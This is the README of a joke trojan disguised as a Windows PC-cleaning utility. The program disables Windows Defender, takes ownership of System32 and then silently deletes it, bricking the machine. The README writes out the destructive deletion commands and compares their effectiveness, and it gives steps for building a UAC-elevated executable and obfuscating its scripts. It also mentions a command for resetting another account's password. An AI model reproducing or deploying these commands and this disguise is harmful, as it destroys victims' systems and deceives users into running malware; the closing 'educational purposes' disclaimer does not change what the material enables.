# What is Trojan.BAT.PC-Optimizer-Pro?
As its name suggests, it is a batchfile trojan, pretending to be something while doing something else. It was my 2020 attempt at being funny after reading a lot about the funny "delete System32" joke and learning some batchfile.

**2026 Update:** It is completely *rewritten* into powershell since it was more easier to write stuff in that tbh. So I guess it's now a **Trojan.PS.PC-Optimizer-Pro**?? xd idk i'm honestly too lazy to change the name of the repo 

The program will pretend to be a windows PC cleaning utility, scanning for unneeded files, and then prompting the user to delete them. This will result in the user unwittingly deleting their System32 folder, as an internet meme xD.

<sub>Also tbh this stupid project took way too much testing on VMs to finalize lol. And I also forgot my Win10 VM password so that is very nice 🙃</sub><br>
<sub><sup>did you know if you are in an admin account in an open computer, you can simply do `net users [user] [new password]` to change `[user]`'s account to `[new password]`?? lowkey saved all of my VMs ngl</sup></sub>
  
# Usage
To use the program, simply download the release, or repo. If you downloaded the repo, you have to "compile" the project yourself (you technically don't need to, but for pure aesthetic purposes, please do lol). This is detailed below. If you downloaded the repease, simply run the executable, allowing it administrator permissions when it requests it.

The program will load up a terminal and run several "tree" commands to make it look like it is scanning for unneeded files. In the meantime, it first completely disables Windows Defender via a few registry tweaks (suprisingly and unfortunately easy, and tamper protection doesn't prevent it at all), and then there are supressed `takeown` and `icacls` commands that give the current user full control of the the System32 directory. It will subsequently prompt the user to "remove" unneeded files, and as a result, silently remove the System32 directory. **This will FULLY BRICK the PC, and require a fresh reinstall of Windows to remedy. Use this program with caution.**

Funnily enough, for the older version (v2.0) Windows Defender actually registers this as a *severe* virus, named *Trojan:Win32/Wacatac.B!ml*. Kinda honored that a shitty batchfile program could be registered as a virus by Defender 😁. If you're curious as to what this means, the "*!ml*" means machine learning, referring to a program that Microsoft has that tries to learn which features of executables are common to malware and which aren't, while "*Wacatac.B*" is an just identifier name that only makes sense to Microsoft to determine which model detected it when troubleshooting. A full VirusTotal analysis can be found [here](https://www.virustotal.com/gui/file/1675047e96cc76cf3e157c839e039ed49a8af8ffc613c94d013c2f4190e35117), where it was flagged by an additional 14 out of 70 antiviruses.

The newer v3.0's VirusTotal analysis can be found [here](https://www.virustotal.com/gui/file/006882ed3418521aa45c2e0d0339123d3e2520a13bcd8b6e883ce24a09ae411b/), with for now suprisingly only 8 detections, mostly flagged as "suspicious" and "possibly malicious by machine learning algorithm". Which is uh, well, if you look at the executable in a text editor, a full copy of the powershell script is literally word-for-word written in there with something like `cmd /c "rd /s /q C:\Windows\System32" 2>&1 | Out-Null` so I'm kinda shocked nobody flagged it on that basis alone lol.

Also note that if you don't compile the program yourself and use the pre-compiled one in the releases, the standard blue window of "are you sure you want to run this executable" will pop up (which you can continue to run the file by selecting *More Info → Run Anyways*).

## How to "Compile"
In my prior versions, I had this complicated ass process where you used like a bat2exe converter, resource hacker, and a vbs-vbe tool, which was a complete mess. Now, you can compile by directly running `build.ps1`. `build.ps1` installs an open source "powershell to executable wrapper" package `ps2exe.1.0.17.nupkg` that I've included in the root of the repo (but you can also install online via `Install-Module ps2exe`, I just like having a local copy). Then it prompts you to include your choice of a warning script, which it then injects into the main powershell script `PC Optimizer Pro.ps1`, and wraps it into an executable that has the `computer.ico` icon and UAC elevation.

I would recommend you encrypt (or rather, obfuscate ig) the `Warning.vbs` into `Warning.vbe` (though I give you the option to use either in the build/compile script) to use in your final executable, as it's aesthetically more pleasing. You can do this by dragging the `.vbs` file onto the `Encode.vbs` after extracing it from the `vba-to-vbe.zip` tool archive.

Congratulations! You have just """compiled""" Trojan. <s>BAT</s> PS.PC-Optimizer-Pro ("compiled" put in a very, very, loose way lmao, for obvious reasons)! :) You should now have a standalone executable. Running the executable will run the trojan.

## Dependencies
This program uses the command prompt, powershell and VBScript, so on the computer running it, both the visual basic script hosts and cmd/ps must be present...

<sub>which is literally every default windows installation xD shush<sub>

## Deletion Efficiency
which brings us to the fact that when deleting System32, it literally deletes the very files it needs to run itself and crashes lol. I've tested multiple commands, like
1. `del "C:\Windows\System32" /f /q /s > NUL 2>&1`
2. `rd /s /q "C:\Windows\System32" > NUL 2>&1`
3. `Remove-Item "C:\Windows\System32\*" -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue`

and out of all 3, the second one gives the highest deletion efficiency when testing in a Win10 VM. In particular, after running the program until crash, then checking the System32 folder using the recovery cmd, we observe that remaining in the folder compared to a normal folder has
 - 794 / 4738 files       = 16.75% 
 - 19 / 144 dirs          = 13.19%
 - 546mil / 2334mil bytes = 23.39%

which is not great, but not too bad either. Regardless, it definetely bricks the PC beyond recovery, which is the point anyways.

# Disclaimers
I **DID NOT** write the `vba-to-vbe.zip`, or the PS2EXE package. The authors, credits, and copyrights to the vbe tool is within the zip file, and the PS2EXE package's repo is linked [here](https://github.com/MScholtes/PS2EXE).

**This program is purely made for EDUCATIONAL PURPOSES, with the assumption that the execution of the program will only be ran in a CONTROLLED TESTING ENVIRONMENT only!**. I do ***NOT*** enourage people to use this program on their own computers, much less computers that other people own. Using malware or any form of harmful software, including joke programs, on your own or others' computers, whether with or without consent, is **strictly prohibited** due to the potential for *severe and unintended consequences*.
